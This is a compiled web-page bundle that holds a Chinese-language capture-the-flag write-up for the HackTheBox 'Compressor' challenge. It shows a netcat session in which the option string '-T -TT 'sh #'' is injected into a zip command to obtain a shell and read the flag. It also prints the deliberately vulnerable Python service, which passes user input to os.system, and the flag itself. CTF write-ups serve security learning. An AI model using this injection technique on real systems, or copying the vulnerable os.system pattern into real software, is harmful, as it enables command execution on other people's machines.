"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[284],{82003:(n,r,e)=>{e.r(r),e.d(r,{assets:()=>c,contentTitle:()=>i,default:()=>x,frontMatter:()=>s,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"HackTheBox/Challenges/Misc/Compressor/index","title":"Compressor","description":"VERY EASY","source":"@site/docs/HackTheBox/Challenges/Misc/Compressor/index.md","sourceDirName":"HackTheBox/Challenges/Misc/Compressor","slug":"/HackTheBox/Challenges/Misc/Compressor/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Misc/Compressor/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Misc/Compressor/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Misc","permalink":"/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges Misc"},"next":{"title":"Web","permalink":"/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges Web"}}');var o=e(74848),a=e(28453);const s={},i="Compressor",c={},d=[];function l(n){const r={a:"a",admonition:"admonition",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(r.header,{children:(0,o.jsx)(r.h1,{id:"compressor",children:"Compressor"})}),"\n",(0,o.jsxs)(r.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,o.jsx)(r.p,{children:"VERY EASY"}),(0,o.jsx)(r.p,{children:"Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called \"Compressor\", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?"})]}),"\n",(0,o.jsxs)(r.p,{children:["\u53c2\u8003 ",(0,o.jsx)(r.a,{href:"https://gtfobins.github.io/gtfobins/zip/",children:"zip | GTFOBins"})]}),"\n",(0,o.jsx)(r.p,{children:"\u4ea4\u4e92\u8fc7\u7a0b\uff1a"}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ nc 94.237.54.161 42473\n\n[*] Directory to work in: P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki\n\nComponent List:\n\n+===============+\n|               |\n|  1. Head  \ud83e\udd16  |\n|  2. Torso \ud83e\uddb4   |\n|  3. Hands \ud83d\udcaa  |\n|  4. Legs  \ud83e\uddb5   |\n|               |\n+===============+\n\n[*] Choose component: 1\n\n[*] Sub-directory to work in: P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki/Head\n\n\nActions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Compress artifact (zip <name>.zip <name> <options>)\n4. Change directory  (cd <dirname>)\n5. Clean directory   (rm -rf ./*)\n6. Exit\n\n[*] Choose action: 1\n\n\nInsert name: a\n\nInsert content: a\n\n\n[+] Artifact [a] was created successfuly!\n\nActions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Compress artifact (zip <name>.zip <name> <options>)\n4. Change directory  (cd <dirname>)\n5. Clean directory   (rm -rf ./*)\n6. Exit\n\n[*] Choose action: 3\n\n\nInsert <name>.zip: a\nInsert <name>: a\nInsert <options>: -T -TT 'sh #'\n  adding: a (stored 0%)\nwhoami\nctf\nls -lh\ntotal 8K\n-rw-r--r--    1 ctf      ctf            1 Mar 11 12:04 a\n-rw-------    1 ctf      ctf          153 Mar 11 12:04 ziiFGlKP\ncd /\nls -lh\ntotal 60K\ndrwxr-xr-x    1 root     root        4.0K Nov 30  2021 bin\ndrwxr-xr-x    5 root     root         360 Mar 11 11:33 dev\ndrwxr-xr-x    1 root     root        4.0K Mar 11 11:33 etc\ndrwxr-xr-x    1 root     root        4.0K Mar  3  2022 home\ndrwxr-xr-x    1 root     root        4.0K Nov 30  2021 lib\ndrwxr-xr-x    5 root     root        4.0K Nov 24  2021 media\ndrwxr-xr-x    2 root     root        4.0K Nov 24  2021 mnt\ndrwxr-xr-x    2 root     root        4.0K Nov 24  2021 opt\ndr-xr-xr-x  240 root     root           0 Mar 11 11:33 proc\ndrwx------    1 root     root        4.0K Mar  3  2022 root\ndrwxr-xr-x    2 root     root        4.0K Nov 24  2021 run\ndrwxr-xr-x    1 root     root        4.0K Nov 30  2021 sbin\ndrwxr-xr-x    2 root     root        4.0K Nov 24  2021 srv\ndr-xr-xr-x   13 root     root           0 Mar 11 11:33 sys\ndrwxrwxrwt    1 root     root        4.0K Mar 11 11:33 tmp\ndrwxr-xr-x    1 root     root        4.0K Mar  3  2022 usr\ndrwxr-xr-x    1 root     root        4.0K Nov 30  2021 var\ncd /home/ctf\nls -lh\ntotal 128K\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:55 0VVzdMgidUTfw3atwgLm1iPJhGb7NQjY\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 0uiih807QNeWlz0QtsnsQo9PgmHH2m7m\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:44 5QxEVTGux9LblQYEvqKN0uGdVPn0azKr\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 7XgWylDz4SxDg0uIWFmRvkoKafQt95Ze\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:52 7mSxNe00ppbWbdvea6VXr5sPxd6bTFCs\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 7ryPDmOAjldjtMXtvma9rTznxbDtQmjo\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:53 8odPwxrsDFrndulPd1UgkcTKBAsdUM74\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:04 Bei7bxNYuARKfRhL0CrhBZOlaa1OPkcs\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 CmkgIxOvQ5xWlTg0dk1i9Kz24H0lBbF2\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 ERk8ADikktz1xdA0ohme1KqbAd6jWYl7\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 IaEuwE1RiC9klnhbg2PZ2iaQ2mNbww8r\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:49 N81x5gi6AxLvR83honwQosL5mbJOccD1\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:53 NZRdbjqrflf0DA77ju2mJ9BklKog3iNj\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:04 P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 TWPLZcdbJ6G9NBeW7YIz5EkgL6TT4gS8\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:58 YdpgPfY3wrpiZMDzSvH5ENp5jE8DKgBz\n-rwxrwxr-x    1 root     root        2.9K May 16  2022 artifacts.py\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:50 bvI3cyDBdUZthCdCBMTjI9N9sBl1lnAR\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:58 c7FT5SPM37JlpFXuqF4bfc5idNH1Llj8\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 cj3PYp1B32cv9KPdGQ3HeGPecBr0jQaD\n-rw-rw-r--    1 root     root         263 May 12  2022 clear.py\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 ej1fVX2nZKYTxqCrfUPx0UYhmBwGoePC\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:01 fOSudjRqbAdOuDFQwruebUV8omWcMiV9\n-rw-rw-r--    1 root     root          41 May 23  2022 flag.txt\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 iyj8yHYIBDa8eICEdBw8vCbKnVSbtDwz\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:47 j1CYHDkz5crnxs2GFsEV0OAxcyu03HV4\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 kyj3jwfjsr35k54TebLBFkfA831aD80e\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 lPWzgC5EtlFQ5SOHUa3kX3zRUPa9u8dc\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:51 ro7CIraxvGeBwDiy30ma8Xo1dBXl6h4y\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 sj1up8FC0lVaUwFHhaHjdDvquSFNuDGk\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 t85xxSJlE5UXeLA82RreBPlgskBuLtYa\ndrwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 yZC7b8WmkNDbYhNLe57eBOOBocwtqxCT\ncat flag.txt\nHTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}\n"})}),"\n",(0,o.jsx)(r.p,{children:"\u5f97\u5230\u4e86\u9898\u76ee\u90e8\u7f72\u7684\u811a\u672c"}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-python",metastring:'title="artifacts.py"',children:'#!/usr/bin/python3\nimport os, random\nfrom termcolor import colored\n\n\nwhitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.\'#/ "\nPATH = "./"\nsub_array = ["Head", "Torso", "Hands", "Legs"]\n\n# Create random directory\ndef rand_dirname(length=32):\n    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"\n    dirname = ""\n    while len(dirname) < length:\n        dirname += random.choice(charset)\n    return dirname\n\ndef check_filename(filename):\n    return all(i in whitelist for i in filename)\n\ndef change_sub_dir(idx, color):\n  print(colored(f"\\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\\n", color))\n  os.chdir(PATH + sub_array[idx])\n\ndef subjects():\n  subs = """\\nComponent List:\n\n+===============+\n|               |\n|  1. Head  \ud83e\udd16  |\n|  2. Torso \ud83e\uddb4   |\n|  3. Hands \ud83d\udcaa  |\n|  4. Legs  \ud83e\uddb5   |\n|               |\n+===============+\n  """\n  print(colored(subs, "magenta"))\n  ans = int(input(colored("[*] Choose component:", "magenta")))\n\n  if ans == 1:\n    change_sub_dir(0, "blue")\n  elif ans == 2:\n    change_sub_dir(1, "green")\n  elif ans == 3:\n    change_sub_dir(2, "cyan")\n  elif ans == 4:\n    change_sub_dir(3, "yellow")\n  else:\n    print(colored("\\n[-] Invalid option!\\n", "red"))\n    exit()\n\ndef menu():\n  m = """\nActions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Compress artifact (zip <name>.zip <name> <options>)\n4. Change directory  (cd <dirname>)\n5. Clean directory   (rm -rf ./*)\n6. Exit\n  """\n  print(colored(m, "yellow"))\n  return int(input(colored("[*] Choose action:", "yellow")))\n\ndef create_file():\n  fname = input(colored("Insert name:", "yellow")).strip()\n  if not check_filename(fname):\n    print(colored("\\n[-] Invalid name!\\n", "red"))\n    exit()\n  os.system(f"touch {fname}")\n  contents = input(colored("\\nInsert content:", "yellow"))\n  f = open(fname, "a")\n  f.write(contents)\n  f.close()\n  print("\\n")\n  print(colored(f"[+] Artifact [{fname}] was created successfuly!", "green"))\n\ndef zip():\n  zip_name = input(colored("Insert <name>.zip:", "blue")).strip()\n  files    = input(colored("Insert <name>:", "blue")).strip()\n  options  = input(colored("Insert <options>:", "blue")).strip()\n  if not check_filename(zip_name) or not check_filename(files) or not check_filename(options):\n    print(colored("\\n[-] Invalid name!\\n", "red"))\n    exit()\n  os.system(f"zip {zip_name}.zip {files} {options}")\n\n# Create directory\ndirname = rand_dirname()\nprint(colored(f"\\n[*] Directory to work in: {dirname}", "cyan"))\nos.mkdir(PATH + dirname)\nos.chdir(PATH + dirname)\nos.system("mkdir -p Head Torso Hands Legs")\n\nans = subjects()\n\nwhile True:\n\n  # Choose action\n  act = menu()\n  print("\\n")\n  if act == 1:\n    create_file()\n  elif act == 3:\n    zip()\n  elif act == 2:\n    os.system("pwd; ls -la")\n  elif act == 5:\n    os.system("rm -rf ./*")\n  elif act == 4:\n    os.chdir(f"../../{dirname}")\n    ans = subjects()\n  else:\n    print(colored("\\n[-] Invalid option!\\n", "red"))\n    os.system("rm -rf ./*")\n    exit()\n'})}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-python",metastring:'title="clear.py"',children:"import os\n\nos.system('ls -la> temp')\n\nf = open('temp', 'r')\nfor line in f:\n  arr = line.split()\n  try:\n    if len(arr[8]) > 16:\n      os.system(f'rm -rf {arr[8]}')\n  except:\n    print('')\n\nprint(f'[+] Directories have been deleted!\\n')\nos.system('rm -f ./temp')\n"})}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-plaintext",metastring:'title="Flag"',children:"HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}\n"})})]})}function x(n={}){const{wrapper:r}={...(0,a.R)(),...n.components};return r?(0,o.jsx)(r,{...n,children:(0,o.jsx)(l,{...n})}):l(n)}},28453:(n,r,e)=>{e.d(r,{R:()=>s,x:()=>i});var t=e(96540);const o={},a=t.createContext(o);function s(n){const r=t.useContext(a);return t.useMemo((function(){return"function"==typeof n?n(r):{...r,...n}}),[r,n])}function i(n){let r;return r=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:s(n.components),t.createElement(a.Provider,{value:r},n.children)}}}]);